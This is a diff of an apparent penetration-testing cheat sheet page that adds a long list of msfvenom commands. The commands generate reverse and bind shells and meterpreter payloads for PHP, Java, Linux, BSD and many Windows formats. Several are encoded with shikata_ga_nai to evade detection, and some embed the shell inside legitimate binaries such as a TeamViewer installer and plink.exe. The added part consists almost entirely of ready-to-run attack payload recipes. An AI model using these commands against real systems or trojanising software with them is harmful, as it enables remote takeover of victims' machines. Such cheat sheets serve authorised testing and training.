@@ -83,7 +83,58 @@ msfvenom <span class="nt">-p</span> linux/x64/shell_reverse_tcp <span class="nt"
 <span class="c"># encode the payload 5 times with shikata_ga_nai,</span>
 <span class="c"># and continue the normal execution of the app by spawning the payload in a separate thread:</span>
 msfvenom <span class="nt">-p</span> windows/x86/meterpreter_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;listen-IP&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;listen-port&gt; <span class="nt">-k</span> <span class="nt">-x</span> ~/Downloads/TeamViewer_Setup.exe <span class="nt">-e</span> x86/shikata_ga_nai <span class="nt">-a</span> x86 <span class="nt">--platform</span> windows <span class="nt">-o</span> ~/Desktop/TeamViewer_Setup.exe <span class="nt">-i</span> 5
+
+<span class="c"># Generate a PHP reverse shell for meterpreter:</span>
+msfvenom <span class="nt">-p</span> php/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;IP&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;port&gt; <span class="nt">-f</span> raw <span class="nt">-o</span> revshell.php
+
+<span class="c"># Generate a Java WAR reverse shell:</span>
+msfvenom <span class="nt">-p</span> java/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;IP&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;port&gt; <span class="nt">-f</span> war <span class="nt">-o</span> revshell.war
+
+<span class="c"># Generate a Linux bind shell:</span>
+msfvenom <span class="nt">-p</span> linux/x86/shell_bind_tcp <span class="nv">LPORT</span><span class="o">=</span>&lt;port&gt; <span class="nt">-f</span> c <span class="nt">-b</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">0a</span><span class="se">\x</span><span class="s2">0d</span><span class="se">\x</span><span class="s2">20"</span> <span class="nt">-e</span> x86/shikata_ga_nai
+
+<span class="c"># Generate a FreeBSD reverse shell:</span>
+msfvenom <span class="nt">-p</span> bsd/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;IP&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;port&gt; <span class="nt">-f</span> elf <span class="nt">-o</span> shell.elf
+
+<span class="c"># Generate a Linux C reverse shell:</span>
+msfvenom  <span class="nt">-p</span> linux/x86/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;IP&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;port&gt; <span class="nt">-e</span> x86/shikata_ga_nai <span class="nt">-f</span> c
+
+<span class="c"># Generate a Windows stageless reverse shell:</span>
+msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;IP&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;port&gt; <span class="nt">-e</span> x86/shikata_ga_nai <span class="nt">-f</span> exe <span class="nt">-o</span> non_staged.exe
+
+<span class="c"># Generate a Windows staged reverse shell for meterpreter:</span>
+msfvenom <span class="nt">-p</span> windows/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;IP&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;port&gt; <span class="nt">-e</span> x86/shikata_ga_nai <span class="nt">-f</span> exe <span class="nt">-o</span> meterpreter.exe
+
+<span class="c"># Generate a Windows Python reverse shell:</span>
+msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;IP&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;port&gt; <span class="nv">EXITFUNC</span><span class="o">=</span>thread <span class="nt">-f</span> python <span class="nt">-o</span> shell.py
+
+<span class="c"># Generate a Windows ASP reverse shell:</span>
+msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;IP&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;port&gt; <span class="nt">-f</span> asp <span class="nt">-e</span> x86/shikata_ga_nai <span class="nt">-o</span> shell.asp
+
+<span class="c"># Generate a Windows ASPX reverse shell:</span>
+msfvenom <span class="nt">-f</span> aspx <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;IP&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;port&gt; <span class="nt">-e</span> x86/shikata_ga_nai <span class="nt">-o</span> shell.aspx
+
+<span class="c"># Generate a JavaScript reverse shell with NOPs:</span>
+msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;IP&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;port&gt; <span class="nt">-f</span> js_le <span class="nt">-e</span> generic/none <span class="nt">-n</span> 18
+
+<span class="c"># Generate a Windows powershell reverse shell:</span>
+msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;IP&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;port&gt; <span class="nt">-e</span> x86/shikata_ga_nai <span class="nt">-i</span> 9 <span class="nt">-f</span> psh <span class="nt">-o</span> shell.ps1
+
+<span class="c"># Generate a Windows reverse shell excluding badchars:</span>
+msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nt">-a</span> x86 <span class="nv">LHOST</span><span class="o">=</span>&lt;IP&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;port&gt; <span class="nv">EXITFUNC</span><span class="o">=</span>thread <span class="nt">-f</span> c <span class="nt">-b</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">04"</span> <span class="nt">-e</span> x86/shikata_ga_nai
+
+<span class="c"># Generate a Windows x64 reverse shell:</span>
+msfvenom <span class="nt">-p</span> windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;IP&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;port&gt; <span class="nt">-f</span> exe <span class="nt">-o</span> shell.exe
+
+<span class="c"># Generate a Windows reverse shell, embedded into plink.exe:</span>
+msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;IP&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;port&gt; <span class="nt">-f</span> exe <span class="nt">-e</span> x86/shikata_ga_nai <span class="nt">-i</span> 9 <span class="nt">-x</span> /usr/share/windows-binaries/plink.exe <span class="nt">-o</span> shell_reverse_msf_encoded_embedded.exe
 </code></pre></div>
+
+<h2>References</h2>
+
+<ul>
+<li><a href="https://gist.github.com/dejisec/8cdc3398610d1a0a91d01c9e1fb02ea1" rel="nofollow">https://gist.github.com/dejisec/8cdc3398610d1a0a91d01c9e1fb02ea1</a></li>
+</ul>
 
     
     </main>
